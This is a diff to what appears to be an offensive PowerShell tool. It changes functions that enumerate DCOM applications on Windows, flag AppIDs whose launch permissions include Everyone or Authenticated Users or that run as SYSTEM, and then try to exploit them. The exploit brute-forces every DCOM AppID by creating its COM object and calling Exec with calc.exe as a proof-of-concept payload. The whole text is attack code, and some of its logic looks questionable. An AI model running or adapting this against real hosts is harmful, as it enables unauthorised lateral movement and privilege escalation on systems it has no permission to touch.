@@ -1237,33 +1237,43 @@ function tryCOMObjectAbuse {
 
 function checkDCOMLateralMovement {
     if ($DEBUG_MODE) { Write-Output "Checking for DCOM Lateral Movement..." }
+
     try {
+        Write-Output "[*] Checking for DCOM misconfigurations..."
         $dcomAppID = Get-WmiObject -Query "SELECT * FROM Win32_DCOMApplication"
         if ($dcomAppID) {
-            Write-Output "[+] DCOM Applications detected (printing max. 5):"
-            $dcomAppID | Select-Object -First 5 | ForEach-Object {
-                $appID = $_.AppID
-                $description = $_.Description
-                Write-Output "AppID: $appID"
-                Write-Output "Description: $description"
+            Write-Output "[+] DCOM Applications detected, analyzing permissions..."
 
-                # Check Launch Permissions
-                $launchPerms = (Get-WmiObject -Query "SELECT * FROM Win32_DCOMApplicationSetting WHERE AppID='$appID'").LaunchPermission
+            $dcomAppID | ForEach-Object {
+                $appID = $_.AppID
+                $appName = $_.Description
+                $appSetting = Get-WmiObject -Query "SELECT * FROM Win32_DCOMApplicationSetting WHERE AppID='$appID'"
+                $launchPerms = $appSetting.LaunchPermission
+                $runAsUser = $appSetting.RunAsUser
+
                 if ($launchPerms) {
-                    Write-Output "Launch Permissions: $launchPerms"
+                    Write-Output "[*] Checking AppID: $appID ($appName)"
+
+                    foreach ($sid in @('S-1-1-0', 'S-1-5-11')) { # SIDs for Everyone and Authenticated Users
+                        if ($launchPerms -contains $sid) {
+                            Write-Output "[+] Found AppID with misconfigured Launch Permissions: $appID ($appName)"
+                            Write-Output "    Launch Permissions include: $sid"
+                            Write-Output "    RunAsUser: $runAsUser"
+                            $gCollect['OtherData']["DCOMLateralMovementMisconfigured"] = $appID
+                            break
+                        }
+                    }
                 } else {
-                    Write-Output "Launch Permissions: Not Found or Not Configured"
+                    if ($DEBUG_MODE) { Write-Output "[-] No Launch Permissions found for AppID: $appID" }
                 }
 
-                # Check Access Permissions
-                $accessPerms = (Get-WmiObject -Query "SELECT * FROM Win32_DCOMApplicationSetting WHERE AppID='$appID'").AccessPermission
-                if ($accessPerms) {
-                    Write-Output "Access Permissions: $accessPerms"
+                # Check if it's running as an elevated user (like SYSTEM)
+                if ($runAsUser -and $runAsUser -match "SYSTEM|Administrator") {
+                    Write-Output "[+] AppID $appID is running as a privileged user: $runAsUser"
                 } else {
-                    Write-Output "Access Permissions: Not Found or Not Configured"
+                    if ($DEBUG_MODE) {  Write-Output "[-] AppID $appID is running as a less privileged user or Interactive User." }
                 }
             }
-            $gCollect['OtherData']["DCOMLateralMovement"] = $dcomAppID.AppID
         } else {
             Write-Output "[-] No DCOM applications found."
         }
@@ -1277,23 +1287,31 @@ function tryDCOMLateralMovement {
 
     try {
         $dcomAppID = Get-WmiObject -Query "SELECT * FROM Win32_DCOMApplication"
-        $dcomAppID | ForEach-Object {
-            $appID = $_.AppID
-            $launchPerms = (Get-WmiObject -Query "SELECT * FROM Win32_DCOMApplicationSetting WHERE AppID='$appID'").LaunchPermission
 
-            if ($launchPerms -and ($launchPerms -contains 'Everyone' -or $launchPerms -contains 'Authenticated Users')) {
-                Write-Output "[+] Found AppID with misconfigured Launch Permissions: $appID"
-
+        # Try misconfigured ones first (if any were found in check phase)
+        if ($gCollect['OtherData']["DCOMLateralMovementMisconfigured"]) {
+            Write-Output "[+] Attempting exploitation on misconfigured DCOM AppID(s)..."
+            $gCollect['OtherData']["DCOMLateralMovementMisconfigured"] | ForEach-Object {
                 try {
-                    # Exploit attempt to trigger lateral movement or privilege escalation
-                    $comObject = [Activator]::CreateInstance([Type]::GetTypeFromCLSID($appID))
-                    $comObject.Exec("calc.exe") # Adjusted for PoC demonstration
-                    Write-Output "[+] DCOM exploitation successful, launched calc.exe"
+                    $comObject = [Activator]::CreateInstance([Type]::GetTypeFromCLSID($_))
+                    $comObject.Exec("calc.exe") # PoC with calc.exe
+                    Write-Output "[+] DCOM exploitation successful on AppID: $_"
                 } catch {
                     Write-Output "[-] Error during DCOM exploitation attempt: $_"
                 }
-            } else {
-                if ($DEBUG_MODE) { Write-Output "[-] No misconfigured Launch Permissions for AppID: $appID" }
+            }
+        }
+
+        # Bruteforce attempt on all AppIDs
+        Write-Output "[+] Bruteforce exploitation attempt on all DCOM AppIDs..."
+        $dcomAppID | ForEach-Object {
+            $appID = $_.AppID
+            try {
+                $comObject = [Activator]::CreateInstance([Type]::GetTypeFromCLSID($appID))
+                $comObject.Exec("calc.exe")
+                Write-Output "[+] DCOM exploitation successful on AppID: $appID"
+            } catch {
+                if ($DEBUG_MODE) { Write-Output "[-] Error during DCOM exploitation attempt on AppID: $appID - $_" }
             }
         }
     } catch {
